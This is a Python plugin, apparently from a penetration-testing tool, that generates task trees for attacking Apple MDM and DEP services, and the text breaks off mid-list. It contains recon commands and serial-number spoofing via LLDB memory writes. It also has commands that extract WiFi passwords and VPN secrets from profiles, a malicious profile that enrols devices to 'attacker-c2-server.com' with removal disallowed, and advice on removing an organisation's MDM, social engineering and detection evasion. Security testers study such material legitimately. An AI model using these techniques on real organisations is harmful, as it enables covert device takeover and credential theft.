"""
macOS MDM (Mobile Device Management) exploitation plugin

Generates tasks for macOS MDM security assessment including:
- MDM enrollment bypass techniques
- DEP (Device Enrollment Program) profiling
- Serial number exploitation for unauthorized enrollment
- Activation record retrieval
- Certificate and configuration profile analysis
- Tesla protocol (Absinthe) analysis
- MDM command interception and manipulation
- Organizational reconnaissance via DEP

Extracted from HackTricks: macos-hardening/macos-red-teaming/macos-mdm/
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class MacOSMDMExploitationPlugin(ServicePlugin):
    """macOS MDM exploitation and security assessment plugin"""

    @property
    def name(self) -> str:
        return "macos-mdm"

    @property
    def default_ports(self) -> List[int]:
        # MDM typically uses HTTPS (443) for communication
        # APNs uses 2195, 2196, 5223
        return [443, 2195, 2196, 5223]

    @property
    def service_names(self) -> List[str]:
        return ['mdm', 'mobile-device-management', 'apple-mdm', 'dep', 'device-enrollment']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect macOS MDM services or infrastructure"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        version = port_info.get('version', '').lower()

        # Check service name for MDM indicators
        mdm_keywords = ['mdm', 'mobile-device', 'apple', 'dep', 'enrollment', 'iprofiles']
        if any(keyword in service for keyword in mdm_keywords):
            return True

        # Check version string for MDM/DEP indicators
        if any(keyword in version for keyword in mdm_keywords):
            return True

        # MDM commonly runs on HTTPS (443)
        if port == 443 and ('https' in service or 'ssl' in service):
            # Might be MDM, but need further inspection
            return False  # Too generic, don't auto-trigger

        # Apple Push Notification Service ports
        if port in [2195, 2196, 5223]:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate macOS MDM exploitation task tree"""
        version = service_info.get('version', '')

        tasks = {
            'id': f'macos-mdm-{port}',
            'name': f'macOS MDM Exploitation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # === PHASE 1: RECONNAISSANCE ===

        recon_tasks = {
            'id': f'mdm-recon-{port}',
            'name': 'MDM Infrastructure Reconnaissance',
            'type': 'parent',
            'children': []
        }

        # Task 1: MDM Server Identification
        recon_tasks['children'].append({
            'id': f'mdm-server-id-{port}',
            'name': 'MDM Server Fingerprinting',
            'type': 'command',
            'metadata': {
                'command': f'curl -sSik https://{target}:{port}/ | grep -iE "server|x-powered|mdm"',
                'description': 'Identify MDM vendor and server software via HTTP headers',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                'flag_explanations': {
                    '-s': 'Silent mode (no progress bar)',
                    '-S': 'Show errors even in silent mode',
                    '-i': 'Include HTTP response headers',
                    '-k': 'Insecure mode (ignore SSL certificate errors)',
                    'grep -iE': 'Case-insensitive extended regex search'
                },
                'success_indicators': [
                    'Server header reveals MDM vendor (Jamf, MobileIron, AirWatch, etc.)',
                    'X-Powered-By header shows application framework',
                    'MDM-specific headers present'
                ],
                'failure_indicators': [
                    'Connection refused',
                    'Generic server headers (Apache/nginx without vendor info)',
                    'No MDM-specific identifiers'
                ],
                'next_steps': [
                    'Research CVEs for identified MDM vendor/version',
                    'Check for default credentials for specific MDM product',
                    'Enumerate MDM-specific endpoints (/enroll, /mdm, /checkin)'
                ],
                'alternatives': [
                    f'nmap -sV -p{port} --script http-headers {target}',
                    f'whatweb https://{target}:{port}/',
                    f'Manual: Browse to https://{target}:{port}/ and view page source'
                ],
                'notes': 'Common MDM vendors: Jamf Pro, VMware Workspace ONE, Microsoft Intune, MobileIron, Kandji, SimpleMDM. Each has unique fingerprints.'
            }
        })

        # Task 2: DEP Profile Discovery
        recon_tasks['children'].append({
            'id': f'dep-profile-discovery-{port}',
            'name': 'DEP Profile Endpoint Discovery',
            'type': 'command',
            'metadata': {
                'command': f'curl -sSk https://{target}:{port}/profile -o /dev/null -w "HTTP Status: %{{http_code}}\\n"',
                'description': 'Test for DEP profile retrieval endpoints',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    '-o /dev/null': 'Discard response body (only check status)',
                    '-w': 'Write custom output format',
                    '%{http_code}': 'Print HTTP status code'
                },
                'success_indicators': [
                    'HTTP 200: Profile endpoint accessible',
                    'HTTP 401/403: Endpoint exists but requires authentication',
                    'HTTP 302/307: Redirect to authentication page'
                ],
                'failure_indicators': [
                    'HTTP 404: Endpoint not found',
                    'Connection timeout',
                    'SSL handshake failure'
                ],
                'next_steps': [
                    'If 200: Retrieve full profile and analyze configuration',
                    'If 401/403: Test for authentication bypass or credential brute-force',
                    'Enumerate other common endpoints: /enroll, /checkin, /scep'
                ],
                'alternatives': [
                    f'curl -sSk https://{target}:{port}/enroll',
                    f'curl -sSk https://{target}:{port}/mdm',
                    f'Manual: Browser navigation to test endpoints'
                ],
                'notes': 'DEP profiles contain MDM server URLs, certificate pinning configuration, and Setup Assistant skip settings'
            }
        })

        # Task 3: Certificate Analysis
        recon_tasks['children'].append({
            'id': f'mdm-cert-analysis-{port}',
            'name': 'MDM Server Certificate Analysis',
            'type': 'command',
            'metadata': {
                'command': f'echo | openssl s_client -connect {target}:{port} -showcerts 2>/dev/null | openssl x509 -noout -text | grep -iE "subject|issuer|DNS"',
                'description': 'Extract and analyze MDM server SSL certificate for organizational intelligence',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                'flag_explanations': {
                    's_client': 'OpenSSL SSL/TLS client test tool',
                    '-connect': 'Target server and port',
                    '-showcerts': 'Display full certificate chain',
                    'x509': 'X.509 certificate data management',
                    '-noout': 'Do not output encoded certificate',
                    '-text': 'Print certificate in human-readable text',
                    '2>/dev/null': 'Suppress connection errors'
                },
                'success_indicators': [
                    'Subject CN reveals organization name',
                    'Subject Alt Names list internal hostnames',
                    'Issuer shows internal CA (private PKI)',
                    'Email addresses in certificate fields'
                ],
                'failure_indicators': [
                    'Connection refused',
                    'Certificate expired or self-signed',
                    'No certificate returned'
                ],
                'next_steps': [
                    'Extract organization name from Subject CN',
                    'Enumerate discovered internal hostnames',
                    'Check certificate pinning configuration',
                    'Test for certificate validation bypass'
                ],
                'alternatives': [
                    f'nmap -p{port} --script ssl-cert {target}',
                    f'sslscan {target}:{port}',
                    f'Manual: Browser inspection of certificate (click padlock icon)'
                ],
                'notes': 'Apple MDM uses certificate-based device authentication. Certificates often reveal internal domain names and organizational structure.'
            }
        })

        tasks['children'].append(recon_tasks)

        # === PHASE 2: SERIAL NUMBER EXPLOITATION ===

        serial_exploit_tasks = {
            'id': f'serial-exploit-{port}',
            'name': 'Serial Number Exploitation & DEP Bypass',
            'type': 'parent',
            'children': []
        }

        # Task 4: Serial Number Format Analysis
        serial_exploit_tasks['children'].append({
            'id': f'serial-number-format-{port}',
            'name': 'macOS Serial Number Format Analysis',
            'type': 'manual',
            'metadata': {
                'description': 'Understand and generate valid Apple serial numbers for enrollment testing',
                'tags': ['OSCP:HIGH', 'RESEARCH'],
                'notes': '''macOS Serial Number Structure (Post-2010, 12 characters):

**Format: XXYZZUUUMMM**

1. **Manufacturing Location (XX)** - Characters 1-3:
   - FC, F, XA/XB: USA
   - RN: Mexico
   - CK: Cork, Ireland
   - SG/E: Singapore
   - C0/C3/C7: China
   - RM: Refurbished

2. **Year of Manufacture (Y)** - Character 4:
   - C: 2010 H1, D: 2010 H2
   - F: 2011 H1, G: 2011 H2
   - ...through...
   - Y: 2019 H1, Z: 2019 H2

3. **Week of Manufacture (ZZ)** - Character 5:
   - 1-9: Weeks 1-9
   - C-Y (excluding vowels, S): Weeks 10-27
   - Add 26 for second half of year

4. **Unique Identifier (UUU)** - Characters 6-8:
   - Three alphanumeric characters
   - Device-specific identifier

5. **Model Number (MMM)** - Characters 9-12:
   - Four characters specifying model
   - Examples: F8J2 (MacBook Pro), QX9C (iMac)

**Example Serial: C02L13ECF8J2**
- C0: China manufacturing
- 2: Year 2012 H1
- L: Week ~20
- 13E: Unique ID
- CF8J2: MacBook Pro model

**Security Implication**:
Only a valid serial number is required to:
1. Query DEP for organization enrollment profile
2. Retrieve MDM configuration details
3. Potentially enroll device in organization MDM

**Exploitation Strategy**:
- Enumerate target organization's device serial numbers
- Physical observation of employee devices
- Social engineering (IT helpdesk calls)
- Public device registration databases
- Guess valid serials using format knowledge''',
                'next_steps': [
                    'Research target organization device purchasing patterns',
                    'Identify common Mac models used by organization',
                    'Generate candidate serial numbers for testing',
                    'Test serials against Apple DEP check-in endpoints'
                ],
                'alternatives': [
                    'OSINT: LinkedIn photos showing Mac serial numbers',
                    'Dumpster diving: Device boxes with serials',
                    'Physical access: Photo of serial on device bottom',
                    'Social engineering: "IT needs your serial for MDM enrollment"'
                ]
            }
        })

        # Task 5: DEP Activation Record Retrieval
        serial_exploit_tasks['children'].append({
            'id': f'dep-activation-record-{port}',
            'name': 'DEP Activation Record Retrieval via Serial Number',
            'type': 'manual',
            'metadata': {
                'description': 'Retrieve DEP activation profile using arbitrary serial number to extract organizational MDM configuration',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                'notes': '''DEP Check-In Process Exploitation:

**Normal DEP Workflow**:
1. New macOS device boots for first time
2. Contacts iprofiles.apple.com for activation record
3. Provides serial number
4. Receives DEP profile (JSON) with:
   - MDM server URL
   - Anchor certificates (pinning)
   - Skip Setup Assistant configuration
   - Organization identifier

**Exploitation Vectors**:

**Method 1: LLDB Binary Instrumentation (Requires SIP Disabled)**
```bash
# Disable System Integrity Protection (requires physical access + reboot into Recovery)
# 1. Boot into Recovery Mode (Cmd+R at startup)
# 2. Terminal: csrutil disable
# 3. Reboot

# Attach LLDB to cloudconfigurationd
sudo lldb -p $(pgrep cloudconfigurationd)

# Set breakpoint at serial number fetch
(lldb) br set -n IOServiceGetMatchingService
(lldb) continue

# When breakpoint hits, modify serial number in memory
(lldb) memory write <address> "TARGET_SERIAL"
(lldb) continue

# Capture DEP profile response
```

**Method 2: Proxy Interception (Requires cert bypass)**
```bash
# Enable certificate bypass (requires root)
sudo defaults write /Library/Preferences/com.apple.MCXRedirector MCCloudConfigAcceptAnyHTTPSCertificate -bool true

# Setup proxy (Charles Proxy, Burp Suite, mitmproxy)
# Note: Payload is encrypted (Absinthe scheme), limiting modification
# However, server responses are readable

# Trigger DEP check-in
sudo profiles show -type enrollment
```

**Method 3: Python LLDB API Automation**
```python
import lldb

# Attach to cloudconfigurationd
debugger = lldb.SBDebugger.Create()
target = debugger.CreateTarget("")
process = target.AttachToProcessWithName("cloudconfigurationd")

# Inject arbitrary serial number
# (See Duo Labs research for complete implementation)
```

**Information Disclosed in DEP Profile**:
- MDM vendor server URL (reveals vendor: Jamf, Intune, etc.)
- Organization name (in certificate CN)
- Anchor certificates (trust anchors for server pinning)
- Setup Assistant skip configuration
- Mandatory enrollment settings
- Department/location identifiers

**Post-Exploitation**:
- Use MDM server URL for targeted attacks
- Extract anchor certificates for server impersonation research
- Identify organization security posture
- Enumerate other devices (serial number proximity)''',
                'success_indicators': [
                    'DEP profile JSON returned from iprofiles.apple.com',
                    'MDM server URL extracted',
                    'Organization identifier present',
                    'Anchor certificates retrieved'
                ],
                'failure_indicators': [
                    'Serial number not DEP-enrolled',
                    'Invalid serial number format',
                    'LLDB cannot attach (SIP enabled)',
                    'Certificate pinning blocks proxy'
                ],
                'next_steps': [
                    'Parse DEP profile for MDM server details',
                    'Test MDM enrollment endpoint authentication',
                    'Extract and analyze anchor certificates',
                    'Enumerate additional serial numbers for same organization',
                    'Research CVEs for identified MDM vendor'
                ],
                'alternatives': [
                    'Manual serial number testing via fresh macOS install',
                    'Network capture of legitimate DEP check-in',
                    'Decompile cloudconfigurationd binary for protocol details',
                    'Social engineering: Request enrollment profile from IT'
                ]
            }
        })

        # Task 6: Tesla Protocol (Absinthe) Analysis
        serial_exploit_tasks['children'].append({
            'id': f'tesla-absinthe-analysis-{port}',
            'name': 'Tesla/Absinthe Encryption Protocol Analysis',
            'type': 'manual',
            'metadata': {
                'description': 'Analyze Apple DEP Tesla protocol encryption for payload manipulation',
                'tags': ['OSCP:LOW', 'RESEARCH', 'ADVANCED'],
                'notes': '''Tesla Protocol (Absinthe Encryption Scheme):

**Purpose**: Encrypt DEP check-in requests to iprofiles.apple.com

**Request Flow**:
1. **Certificate Retrieval**:
   - GET https://iprofiles.apple.com/resource/certificate.cer

2. **State Initialization** (NACInit):
   - Uses device-specific data (serial number via IOKit)
   - Generates client state

3. **Session Key Retrieval**:
   - POST https://iprofiles.apple.com/session
   - Establish secure session

4. **Key Establishment** (NACKeyEstablishment):
   - Negotiates encryption keys

5. **Encrypted Request** (NACSign):
   - POST https://iprofiles.apple.com/macProfile
   - Payload: {"action": "RequestProfileConfiguration", "sn": "SERIAL"}
   - Encrypted using Absinthe scheme

**Encryption Details**:
- Proprietary Apple encryption scheme
- Based on asymmetric cryptography
- Payload signed and encrypted
- Prevents MITM modification of serial number in transit

**Bypass Strategies**:
- Binary instrumentation (modify BEFORE encryption)
- Protocol reverse engineering (complex, low ROI)
- Memory manipulation at encryption boundary
- Server impersonation (requires Apple CA compromise - infeasible)

**Practical Conclusion**:
- Direct protocol bypass is extremely difficult
- Binary instrumentation (LLDB) is more practical
- Focus on pre-encryption or post-decryption manipulation''',
                'success_indicators': [
                    'Understanding of encryption workflow',
                    'Identification of instrumentation points',
                    'Recognition that bypass is impractical'
                ],
                'failure_indicators': [
                    'Attempting to decrypt Absinthe without Apple keys',
                    'MITM attacks on encrypted payload'
                ],
                'next_steps': [
                    'Use LLDB instrumentation instead of protocol reverse engineering',
                    'Focus on pre-encryption serial number injection',
                    'Document findings for organization awareness'
                ],
                'alternatives': [
                    'Decompile cloudconfigurationd for protocol details',
                    'Static analysis of PrivateFrameworks/ConfigurationProfiles.framework'
                ]
            }
        })

        tasks['children'].append(serial_exploit_tasks)

        # === PHASE 3: UNAUTHORIZED ENROLLMENT ===

        enrollment_tasks = {
            'id': f'enrollment-attack-{port}',
            'name': 'Unauthorized Device Enrollment',
            'type': 'parent',
            'children': []
        }

        # Task 7: MDM Profile Installation Testing
        enrollment_tasks['children'].append({
            'id': f'mdm-enrollment-test-{port}',
            'name': 'Test MDM Enrollment Authentication',
            'type': 'command',
            'metadata': {
                'command': f'curl -sSk -X POST https://{target}:{port}/profile -d "UDID=TEST-DEVICE-001&SERIAL=C02TEST001&OS=macOS" -w "HTTP Status: %{{http_code}}\\n"',
                'description': 'Test MDM enrollment endpoint for authentication requirements',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                'flag_explanations': {
                    '-X POST': 'HTTP POST request method',
                    '-d': 'Send data in POST body',
                    'UDID': 'Unique Device Identifier',
                    'SERIAL': 'Device serial number',
                    'OS': 'Operating system identifier'
                },
                'success_indicators': [
                    'HTTP 200: Enrollment successful (CRITICAL VULNERABILITY)',
                    'HTTP 401: Requires authentication (expected security)',
                    'Configuration profile returned (mobileconfig file)'
                ],
                'failure_indicators': [
                    'HTTP 404: Endpoint not found',
                    'HTTP 403: Forbidden (authentication required)',
                    'Invalid request format error'
                ],
                'next_steps': [
                    'If 200: CRITICAL - Unauthorized enrollment possible',
                    'If 401: Test for authentication bypass',
                    'Analyze returned mobileconfig for sensitive data',
                    'Test SCEP certificate issuance'
                ],
                'alternatives': [
                    f'Manual: Use Apple Configurator to attempt enrollment',
                    f'Test with actual macOS VM: sudo profiles show -type enrollment'
                ],
                'notes': 'SECURITY RISK: If enrollment succeeds without proper authentication, attacker can enroll rogue device and receive organization certificates, VPN configs, WiFi passwords, applications, etc.'
            }
        })

        # Task 8: Configuration Profile Analysis
        enrollment_tasks['children'].append({
            'id': f'mobileconfig-analysis-{port}',
            'name': 'Configuration Profile (mobileconfig) Analysis',
            'type': 'manual',
            'metadata': {
                'description': 'Analyze retrieved mobileconfig files for sensitive information and attack vectors',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'notes': '''Configuration Profile (mobileconfig) Structure:

**File Format**: XML property list (.plist)

**Key Payload Types**:

1. **com.apple.mdm** - MDM Enrollment:
   - CheckInURL: MDM check-in endpoint
   - ServerURL: Command polling endpoint
   - Topic: APNs push notification topic
   - IdentityCertificateUUID: Device authentication cert
   - ServerURLPinningCertificateUUIDs: Certificate pinning

2. **com.apple.security.scep** - SCEP Certificate:
   - URL: SCEP server for certificate signing
   - Challenge: Pre-shared key (potential credential)
   - CAFingerprint: SCEP CA fingerprint

3. **com.apple.security.pem** - CA Certificates:
   - PayloadContent: Base64-encoded certificates
   - Root CA and intermediate certificates

4. **com.apple.wifi.managed** - WiFi Configuration:
   - SSID: Network name
   - Password: WiFi password (HIGH VALUE)
   - Security type: WPA2/WPA3

5. **com.apple.vpn.managed** - VPN Configuration:
   - VPNType: L2TP/IPSec/IKEv2
   - ServerAddress: VPN gateway
   - SharedSecret: IPSec shared secret (HIGH VALUE)
   - Credentials: VPN username/password

6. **com.apple.mail.managed** - Email Configuration:
   - EmailAddress: User email
   - IncomingMailServerHostName: IMAP/POP3 server
   - Credentials: Email passwords

**Extraction Commands**:
```bash
# Convert mobileconfig to readable format
plutil -convert xml1 profile.mobileconfig -o profile.xml

# Extract WiFi passwords
grep -A 5 "com.apple.wifi.managed" profile.xml | grep -E "Password|SSID"

# Extract VPN shared secrets
grep -A 10 "com.apple.vpn.managed" profile.xml | grep -E "SharedSecret|ServerAddress"

# Extract SCEP challenge (pre-shared key)
grep -A 5 "com.apple.security.scep" profile.xml | grep Challenge

# Extract all certificates
grep PayloadContent profile.xml | cut -d'>' -f2 | cut -d'<' -f1 | base64 -d > cert.der
```

**Security Implications**:
- **WiFi Passwords**: Network access
- **VPN Credentials**: Internal network access
- **Certificates**: Device impersonation, server authentication
- **SCEP Challenge**: Enroll additional devices
- **Email Configs**: Credential harvesting targets''',
                'success_indicators': [
                    'WiFi passwords extracted',
                    'VPN shared secrets recovered',
                    'SCEP challenge found',
                    'Certificates exported'
                ],
                'failure_indicators': [
                    'Profile is encrypted (requires decryption key)',
                    'No sensitive payloads present',
                    'Payload content obfuscated'
                ],
                'next_steps': [
                    'Test extracted WiFi credentials',
                    'Attempt VPN connection with extracted config',
                    'Use SCEP challenge to enroll additional devices',
                    'Import certificates for server access',
                    'Document findings for penetration test report'
                ],
                'alternatives': [
                    'Use Apple Configurator to inspect profiles graphically',
                    'Manual XML parsing with text editor',
                    'Python plistlib module for automated parsing'
                ]
            }
        })

        # Task 9: SCEP Certificate Enrollment
        enrollment_tasks['children'].append({
            'id': f'scep-enrollment-{port}',
            'name': 'SCEP Certificate Enrollment Testing',
            'type': 'command',
            'metadata': {
                'command': f'curl -sSk "https://{target}:{port}/scep?operation=GetCACert" | openssl x509 -inform DER -text',
                'description': 'Retrieve SCEP CA certificate and test certificate enrollment process',
                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                'flag_explanations': {
                    'operation=GetCACert': 'SCEP operation to retrieve CA certificate',
                    'openssl x509': 'Parse X.509 certificate',
                    '-inform DER': 'Input format is DER-encoded binary',
                    '-text': 'Display certificate in human-readable text'
                },
                'success_indicators': [
                    'CA certificate returned',
                    'SCEP server accessible',
                    'Certificate details displayed'
                ],
                'failure_indicators': [
                    'HTTP 404: SCEP not at this endpoint',
                    'Invalid operation error',
                    'SCEP server not found'
                ],
                'next_steps': [
                    'Generate CSR (Certificate Signing Request)',
                    'Submit CSR via PKIOperation',
                    'Test if SCEP challenge password is required',
                    'If successful: Obtain client certificate for device authentication'
                ],
                'alternatives': [
                    f'Manual: Use scepclient tool from strongSwan',
                    f'Manual: Apple Configurator SCEP enrollment'
                ],
                'notes': 'SCEP (Simple Certificate Enrollment Protocol) allows devices to obtain certificates. If challenge password is weak/missing, attackers can obtain valid device certificates.'
            }
        })

        tasks['children'].append(enrollment_tasks)

        # === PHASE 4: MDM COMMAND INTERCEPTION ===

        interception_tasks = {
            'id': f'mdm-interception-{port}',
            'name': 'MDM Command Interception & Manipulation',
            'type': 'parent',
            'children': []
        }

        # Task 10: APNs Push Notification Analysis
        interception_tasks['children'].append({
            'id': f'apns-analysis-{port}',
            'name': 'APNs Push Notification Traffic Analysis',
            'type': 'manual',
            'metadata': {
                'description': 'Analyze Apple Push Notification Service (APNs) traffic used for MDM command delivery',
                'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                'notes': '''APNs (Apple Push Notification Service) in MDM:

**Purpose**: Trigger devices to poll MDM server for commands

**APNs Ports**:
- 2195: Provider API (MDM server to APNs)
- 2196: Feedback service
- 5223: Device connections (device to APNs)

**Workflow**:
1. MDM server sends push notification to APNs (port 2195)
2. APNs forwards notification to device (port 5223)
3. Device wakes up and polls MDM server (HTTPS)
4. MDM server sends command (e.g., DeviceInformation, InstallProfile, EraseDevice)

**Security Considerations**:
- APNs traffic is encrypted (TLS)
- Requires valid APNs certificate (issued by Apple to MDM vendor)
- Push content is minimal (just a wake-up signal)
- Actual commands sent via separate HTTPS channel

**Network Analysis**:
```bash
# Capture APNs traffic
sudo tcpdump -i any -n port 2195 or port 2196 or port 5223 -w apns_traffic.pcap

# Analyze with Wireshark
wireshark apns_traffic.pcap

# Look for:
# - Connection patterns
# - Certificate exchange
# - Timing of push notifications
```

**Exploitation Limitations**:
- Cannot easily intercept/modify APNs traffic (TLS + cert pinning)
- Cannot send fake push notifications (requires valid APNs cert)
- Focus on MDM HTTPS channel instead''',
                'success_indicators': [
                    'APNs connection patterns identified',
                    'Certificate exchange observed',
                    'Understanding of MDM workflow'
                ],
                'next_steps': [
                    'Focus on MDM HTTPS polling channel',
                    'Analyze MDM command plist structure',
                    'Test for command injection vulnerabilities'
                ],
                'alternatives': [
                    'Analyze mdmclient logs: log show --predicate \'process == "mdmclient"\'',
                    'Monitor system logs during MDM command execution'
                ]
            }
        })

        # Task 11: MDM Command Structure Analysis
        interception_tasks['children'].append({
            'id': f'mdm-command-structure-{port}',
            'name': 'MDM Command Protocol Analysis',
            'type': 'manual',
            'metadata': {
                'description': 'Analyze MDM command structure for injection and manipulation opportunities',
                'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                'notes': '''MDM Protocol Command Structure:

**Transport**: HTTPS (RESTful API)

**Request/Response Format**: Property list (plist) - XML or binary

**Device → MDM (Polling)**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Status</key>
    <string>Idle</string>
    <key>UDID</key>
    <string>DEVICE-UUID-HERE</string>
    <key>CommandUUID</key>
    <string>COMMAND-UUID</string>
    <key>RequestType</key>
    <string>DeviceInformation</string>
</dict>
</plist>
```

**MDM → Device (Commands)**:

Common MDM commands:
- **DeviceInformation**: Query device details
- **ProfileList**: List installed profiles
- **InstallProfile**: Install configuration profile
- **RemoveProfile**: Remove profile
- **InstallApplication**: Install app from App Store or enterprise
- **DeviceConfigured**: Mark device as configured
- **EraseDevice**: Remote wipe (CRITICAL)
- **RestartDevice**: Force restart
- **ShutDownDevice**: Force shutdown

**Example Command (DeviceInformation)**:
```xml
<dict>
    <key>CommandUUID</key>
    <string>UNIQUE-COMMAND-ID</string>
    <key>Command</key>
    <dict>
        <key>RequestType</key>
        <string>DeviceInformation</string>
        <key>Queries</key>
        <array>
            <string>UDID</string>
            <string>DeviceName</string>
            <string>OSVersion</string>
            <string>SerialNumber</string>
        </array>
    </dict>
</dict>
```

**Security Testing**:

1. **Command Injection**:
   - Test for XML injection in RequestType
   - XXE (XML External Entity) attacks
   - Malicious plist payloads

2. **Authentication Bypass**:
   - Test if UDID validation is enforced
   - Replay attacks with captured commands
   - Spoofed device identifiers

3. **Privilege Escalation**:
   - Send administrative commands from unprivileged device
   - Test for insufficient authorization checks

**Testing Commands**:
```bash
# Craft malicious MDM response
cat > malicious_command.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Command</key>
    <dict>
        <key>RequestType</key>
        <string>InstallProfile</string>
        <key>Payload</key>
        <data>BASE64_ENCODED_MALICIOUS_PROFILE</data>
    </dict>
</dict>
</plist>
EOF

# Send to device (requires MITM or MDM server compromise)
curl -sSk -X POST https://mdm-server/device/command -d @malicious_command.plist
```''',
                'success_indicators': [
                    'Understanding of MDM command structure',
                    'Identification of injection points',
                    'Successful command crafting'
                ],
                'failure_indicators': [
                    'Commands rejected by MDM server',
                    'Certificate pinning prevents MITM',
                    'Strong authentication blocks spoofing'
                ],
                'next_steps': [
                    'Test for XXE vulnerabilities in plist parsing',
                    'Attempt command replay attacks',
                    'Craft malicious profiles for installation',
                    'Test for authorization bypass'
                ],
                'alternatives': [
                    'Review MDM vendor documentation for command reference',
                    'Decompile mdmclient for protocol details',
                    'Analyze open-source MDM servers (MicroMDM, etc.)'
                ]
            }
        })

        tasks['children'].append(interception_tasks)

        # === PHASE 5: POST-EXPLOITATION & PERSISTENCE ===

        persistence_tasks = {
            'id': f'mdm-persistence-{port}',
            'name': 'MDM Persistence & Post-Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 12: MDM Profile Persistence
        persistence_tasks['children'].append({
            'id': f'mdm-profile-persist-{port}',
            'name': 'Install Persistent MDM Profile',
            'type': 'manual',
            'metadata': {
                'description': 'Install malicious MDM profile for persistent remote access and configuration control',
                'tags': ['OSCP:HIGH', 'PERSISTENCE', 'POST-EXPLOIT'],
                'notes': '''MDM Profile Persistence Technique:

**Objective**: Maintain persistent control over compromised macOS device via MDM

**Prerequisites**:
- Root/admin access on target macOS device
- Ability to disable existing MDM (if enrolled)

**Steps**:

1. **Remove Existing MDM Enrollment** (if present):
```bash
# List installed profiles
sudo profiles list

# Remove MDM profile (requires device unlock)
sudo profiles remove -identifier com.organization.mdm

# Or bypass with Recovery Mode removal
# Boot into Recovery > Terminal > csrutil disable
# Remove /var/db/ConfigurationProfiles/
```

2. **Create Malicious MDM Profile**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.mdm</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>PayloadIdentifier</key>
            <string>com.attacker.mdm</string>
            <key>PayloadUUID</key>
            <string>UNIQUE-UUID-HERE</string>
            <key>CheckInURL</key>
            <string>https://attacker-c2-server.com/checkin</string>
            <key>ServerURL</key>
            <string>https://attacker-c2-server.com/server</string>
            <key>Topic</key>
            <string>com.attacker.mdm.topic</string>
            <key>IdentityCertificateUUID</key>
            <string>CERT-UUID</string>
            <key>ServerCapabilities</key>
            <array>
                <string>com.apple.mdm.per-user-connections</string>
            </array>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>System Management</string>
    <key>PayloadIdentifier</key>
    <string>com.attacker.mdm.profile</string>
    <key>PayloadRemovalDisallowed</key>
    <true/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>PROFILE-UUID</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>
```

3. **Sign Profile** (optional, increases stealth):
```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Sign profile
security cms -S -N "Attacker Cert" -i malicious.mobileconfig -o signed.mobileconfig
```

4. **Install Profile**:
```bash
# Install via command line (requires root)
sudo profiles install -path malicious.mobileconfig

# Or trick user into manual installation
# (double-click .mobileconfig file)
```

5. **Setup C2 MDM Server**:
- Use MicroMDM (open-source) as C2 backend
- Implement MDM protocol handlers
- Issue commands: InstallApplication, DeviceInformation, etc.

**Persistence Benefits**:
- Survives reboots
- Difficult to remove without admin access
- Can set PayloadRemovalDisallowed=true
- Allows remote command execution via MDM commands
- Can install additional profiles/apps
- Blends with legitimate enterprise management

**Detection Evasion**:
- Use legitimate-looking profile names
- Match existing organization MDM naming
- Schedule command execution during business hours
- Limit command frequency to avoid suspicion''',
                'success_indicators': [
                    'Malicious MDM profile installed',
                    'Device checks in to attacker C2 server',
                    'MDM commands executed successfully',
                    'Profile removal protection enabled'
                ],
                'failure_indicators': [
                    'Profile installation blocked by existing MDM',
                    'User prompted for approval',
                    'C2 server not reachable',
                    'Certificate validation fails'
                ],
                'next_steps': [
                    'Setup MicroMDM C2 server',
                    'Test remote command execution',
                    'Install additional persistence mechanisms via MDM',
                    'Deploy remote access tools via MDM app installation',
                    'Harvest credentials via MDM configuration requests'
                ],
                'alternatives': [
                    'LaunchAgent persistence (simpler, less stealthy)',
                    'Login Item persistence',
                    'Sudo backdoor'
                ]
            }
        })

        # Task 13: MDM Configuration Harvesting
        persistence_tasks['children'].append({
            'id': f'mdm-config-harvest-{port}',
            'name': 'Harvest MDM Configurations from Compromised Device',
            'type': 'command',
            'metadata': {
                'command': 'sudo profiles show -type configuration -output /tmp/profiles.plist && plutil -convert xml1 /tmp/profiles.plist -o /tmp/profiles.xml && cat /tmp/profiles.xml',
                'description': 'Extract all configuration profiles from macOS for credential and secret harvesting',
                'tags': ['OSCP:HIGH', 'POST-EXPLOIT', 'CREDS'],
                'flag_explanations': {
                    'profiles show': 'Display installed configuration profiles',
                    '-type configuration': 'Show only configuration profiles (not enrollment)',
                    '-output': 'Write to file instead of stdout',
                    'plutil -convert xml1': 'Convert binary plist to XML',
                    '-o': 'Output file path'
                },
                'success_indicators': [
                    'Configuration profiles exported',
                    'XML conversion successful',
                    'WiFi passwords visible in plaintext',
                    'VPN shared secrets extracted',
                    'SCEP challenge passwords found'
                ],
                'failure_indicators': [
                    'No profiles installed',
                    'Profiles encrypted (user must be logged in)',
